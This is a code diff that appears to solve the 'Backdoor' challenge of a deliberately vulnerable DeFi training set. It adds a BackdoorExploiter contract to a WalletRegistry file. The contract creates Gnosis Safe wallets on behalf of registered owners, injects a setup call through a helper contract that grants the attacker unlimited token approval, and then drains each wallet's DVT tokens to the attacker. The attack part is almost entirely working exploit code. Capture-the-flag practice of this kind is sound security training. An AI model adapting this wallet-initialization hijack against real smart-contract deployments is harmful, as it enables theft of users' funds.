@@ -6,6 +6,8 @@ import "solady/src/utils/SafeTransferLib.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import "hardhat/console.sol";
 
 /**
  * @title WalletRegistry
@@ -131,5 +133,71 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
             ),
             (address)
         );
+    }
+}
+
+
+
+contract BackdoorExploiter{
+    address public immutable masterCopy;
+    address public immutable walletRegistry;
+    address public immutable walletFactory;
+    address[] public owners;
+    address public immutable attacker;
+    address public immutable DVT;
+    address public immutable supporterContract;
+
+    constructor(address _masterCopy, address _walletRegistry, address _walletFactory, address[] memory _owners,  address _DVT){
+        masterCopy = _masterCopy;
+        walletRegistry = _walletRegistry;
+        walletFactory = _walletFactory;
+        owners = _owners;
+        attacker = msg.sender;
+        DVT = _DVT;
+        supporterContract = address(new exploitSupport(_DVT));
+        exploit();
+    }
+
+    function exploit() public {
+        address[] memory wallets = new address[](owners.length);
+        bytes memory moduleData = abi.encodeWithSignature(
+            "approve(address)",
+           address(this)
+        );
+        for (uint256 i = 0; i < owners.length; i++) {
+            address[] memory currentOwners = new address[](1);
+            currentOwners[0] = owners[i];
+              bytes memory initializer = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                currentOwners,
+                1,
+               supporterContract,
+                moduleData,
+                address(0),
+                address(0),
+                0,
+                address(0)
+            );
+            wallets[i] = address(GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(masterCopy,initializer,i, IProxyCreationCallback(walletRegistry)));
+            IERC20(DVT).transferFrom(wallets[i], attacker, IERC20(DVT).balanceOf(wallets[i]));
+            console.log("DVT balance: %s", IERC20(DVT).balanceOf(attacker));
+        }
+    }
+
+
+    function approve(address spender) public {
+        IERC20(DVT).approve(spender, type(uint256).max);
+    }
+}
+
+
+
+contract exploitSupport {
+    address public immutable DVT;
+    constructor(address _DVT){
+        DVT = _DVT;
+    }
+    function approve(address spender) public {
+        IERC20(DVT).approve(spender, type(uint256).max);
     }
 }
